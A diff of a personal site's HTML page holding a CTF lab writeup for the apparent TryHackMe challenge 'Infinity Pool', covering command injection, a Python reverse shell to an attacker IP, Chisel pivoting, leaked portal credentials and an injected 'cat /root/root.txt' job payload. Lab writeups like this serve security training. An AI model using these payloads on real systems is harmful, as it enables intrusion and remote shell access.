@@ -4,24 +4,25 @@
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>Infinity Pool · hackerholidays</title>
-<meta name="description" content="CTF writeup: Infinity Pool (hackerholidays)" />
+<meta name="description" content="Welcome to Day 11 of the TryHackMe Hacker Holidays 2026 writeups." />
 <meta name="theme-color" content="#16161e" />
 <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' https://fonts.googleapis.com 'unsafe-inline'; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https:; object-src 'none'; base-uri 'self'; frame-ancestors 'self'" />
 <link rel="canonical" href="https://aaadarsh1337.github.io/writeups/hackerholidays/infinity_pool/" />
 <meta property="og:type" content="article" />
 <meta property="og:title" content="Infinity Pool · hackerholidays" />
-<meta property="og:description" content="CTF writeup: Infinity Pool (hackerholidays)" />
+<meta property="og:description" content="Welcome to Day 11 of the TryHackMe Hacker Holidays 2026 writeups." />
 <meta property="og:url" content="https://aaadarsh1337.github.io/writeups/hackerholidays/infinity_pool/" />
-<meta property="og:image" content="https://aaadarsh1337.github.io/assets/avatar.jpg" />
-<meta name="twitter:card" content="summary" />
+<meta property="og:image" content="https://aaadarsh1337.github.io/writeups/hackerholidays/infinity_pool/og.png" />
+<meta name="twitter:card" content="summary_large_image" />
 <meta name="twitter:title" content="Infinity Pool · hackerholidays" />
-<meta name="twitter:description" content="CTF writeup: Infinity Pool (hackerholidays)" />
-<meta name="twitter:image" content="https://aaadarsh1337.github.io/assets/avatar.jpg" />
-<script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Infinity Pool · hackerholidays", "description": "CTF writeup: Infinity Pool (hackerholidays)", "url": "https://aaadarsh1337.github.io/writeups/hackerholidays/infinity_pool/", "author": {"@type": "Person", "name": "Adarsh Pillai", "url": "https://aaadarsh1337.github.io/"}}</script>
+<meta name="twitter:description" content="Welcome to Day 11 of the TryHackMe Hacker Holidays 2026 writeups." />
+<meta name="twitter:image" content="https://aaadarsh1337.github.io/writeups/hackerholidays/infinity_pool/og.png" />
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Infinity Pool · hackerholidays", "description": "Welcome to Day 11 of the TryHackMe Hacker Holidays 2026 writeups.", "url": "https://aaadarsh1337.github.io/writeups/hackerholidays/infinity_pool/", "author": {"@type": "Person", "name": "Adarsh Pillai", "url": "https://aaadarsh1337.github.io/"}}</script>
 <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' fill='%2316161e'/%3E%3Crect x='13' y='4' width='6' height='24' fill='%237DCFFF'/%3E%3Crect x='4' y='13' width='24' height='6' fill='%237DCFFF'/%3E%3Crect x='14' y='6' width='4' height='20' fill='%2316161e'/%3E%3Crect x='6' y='14' width='20' height='4' fill='%2316161e'/%3E%3C/svg%3E" />
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../../css/tokens.css" />
 <link rel="stylesheet" href="../../css/style.css" />
 <link rel="stylesheet" href="../../css/pygments.css" />
 </head>
@@ -71,6 +72,7 @@
         <span class="tb-label">READING</span>
         <span>notes.md</span>
       </div>
+      <button type="button" class="btn btn--ghost btn--small" id="copyLinkBtn">Copy link</button>
       <a class="btn btn--ghost btn--small" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/infinity_pool/notes.md" target="_blank" rel="noopener noreferrer">Source &#8599;</a>
     </div>
     <div class="reader__body">
@@ -84,13 +86,13 @@
 <p><code>Byte Lotus Hotel promises a seamless stay powered by modern technology. Sometimes the most interesting systems are the ones guests were never meant to see.</code></p>
 </blockquote>
 <p>Checking <code>robots.txt</code> revealed two disallowed paths:</p>
-<div class="highlight"><pre><span></span><code>User-agent: *
+<div class="highlight is-output lang-text" data-lang="text"><pre><span></span><code>User-agent: *
 Disallow: /internal/
 Disallow: /status
 </code></pre></div>
 
 <p>Reviewing <code>app.js</code> revealed an internal endpoint:</p>
-<div class="highlight"><pre><span></span><code>// Byte Lotus front-end bootstrap.
+<div class="highlight is-output lang-text" data-lang="text"><pre><span></span><code>// Byte Lotus front-end bootstrap.
 // TODO(ops): the staff connectivity tool at /status posts to the legacy
 // /internal/netcheck handler. Keep it out of the public nav until the new
 // auth gateway ships. Disallowed in robots.txt for now.
@@ -98,51 +100,51 @@ console.log(&quot;Stay Noticed™&quot;);
 </code></pre></div>
 
 <p>The <code>/internal/netcheck</code> endpoint was vulnerable to command injection. Testing it with:</p>
-<div class="highlight"><pre><span></span><code>; whoami
+<div class="highlight is-output lang-text" data-lang="text"><pre><span></span><code>; whoami
 </code></pre></div>
 
 <p>returned:</p>
-<div class="highlight"><pre><span></span><code>web
+<div class="highlight is-output lang-text" data-lang="text"><pre><span></span><code>web
 ping: usage error: Destination address required
 </code></pre></div>
 
 <p>We then used a Python reverse shell:</p>
-<div class="highlight"><pre><span></span><code>; python3 -c &#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.188.174&quot;,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#39;
+<div class="highlight is-output lang-text" data-lang="text"><pre><span></span><code>; python3 -c &#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.188.174&quot;,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#39;
 </code></pre></div>
 
 <p>This gave us a shell and allowed us to retrieve the user flag:</p>
-<blockquote>
+<blockquote class="flag">
 <p><code>THM{...}</code></p>
 </blockquote>
 <p>Next, we ran <code>linpeas.sh</code> to check for privilege escalation opportunities. Several interesting services were running on ports <code>8080</code>, <code>9000</code>, and <code>3000</code>.</p>
 <p>We used Chisel to pivot to the internal services.</p>
 <p>On the target:</p>
-<div class="highlight"><pre><span></span><code>./chisel_1.11.8_linux_amd64<span class="w"> </span>client<span class="w"> </span><span class="m">192</span>.168.188.174:8000<span class="w"> </span>R:8080:localhost:8080
+<div class="highlight is-terminal lang-bash" data-lang="bash"><pre><span></span><code>./chisel_1.11.8_linux_amd64<span class="w"> </span>client<span class="w"> </span><span class="m">192</span>.168.188.174:8000<span class="w"> </span>R:8080:localhost:8080
 </code></pre></div>
 
 <p>On Kali:</p>
-<div class="highlight"><pre><span></span><code>chisel<span class="w"> </span>server<span class="w"> </span>--port<span class="w"> </span><span class="m">8000</span><span class="w"> </span>--reverse
+<div class="highlight is-terminal lang-bash" data-lang="bash"><pre><span></span><code>chisel<span class="w"> </span>server<span class="w"> </span>--port<span class="w"> </span><span class="m">8000</span><span class="w"> </span>--reverse
 </code></pre></div>
 
 <p>We then opened <code>localhost:8080</code> in the browser and found an Apache site with an <code>/admin</code> endpoint.</p>
 <p>The internal API on port <code>3000</code> exposed configuration details:</p>
-<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-sS<span class="w"> </span>localhost:3000/api/config
+<div class="highlight is-terminal lang-bash" data-lang="bash"><pre><span></span><code>curl<span class="w"> </span>-sS<span class="w"> </span>localhost:3000/api/config
 </code></pre></div>
 
 <p>The response revealed the telephony portal credentials:</p>
-<div class="highlight"><pre><span></span><code>FreePBXUCPTemplateCreator:St4yN0t1c3d_2026
+<div class="highlight is-output lang-text" data-lang="text"><pre><span></span><code>FreePBXUCPTemplateCreator:St4yN0t1c3d_2026
 </code></pre></div>
 
 <p>We logged in to the portal on port <code>8080</code> using these credentials. After adding the voicemail widget, we obtained the automation key:</p>
-<div class="highlight"><pre><span></span><code>cc_auto_7b3f9a1c4e0d2f6a
+<div class="highlight is-output lang-text" data-lang="text"><pre><span></span><code>cc_auto_7b3f9a1c4e0d2f6a
 </code></pre></div>
 
 <p>The automation service was running on port <code>9000</code>. We used the key to submit a job with command injection:</p>
-<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-sS<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://localhost:9000/jobs/export<span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a&#39;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span>--data-binary<span class="w"> </span><span class="s1">&#39;{&quot;report&quot;:&quot;test;cat /root/root.txt;#&quot;}&#39;</span>
+<div class="highlight is-terminal lang-bash" data-lang="bash"><pre><span></span><code>curl<span class="w"> </span>-sS<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://localhost:9000/jobs/export<span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a&#39;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span>--data-binary<span class="w"> </span><span class="s1">&#39;{&quot;report&quot;:&quot;test;cat /root/root.txt;#&quot;}&#39;</span>
 </code></pre></div>
 
 <p>This retrieved the root flag:</p>
-<blockquote>
+<blockquote class="flag">
 <p><code>THM{...}</code></p>
 </blockquote>
 <p>Happy Hacking!</p>
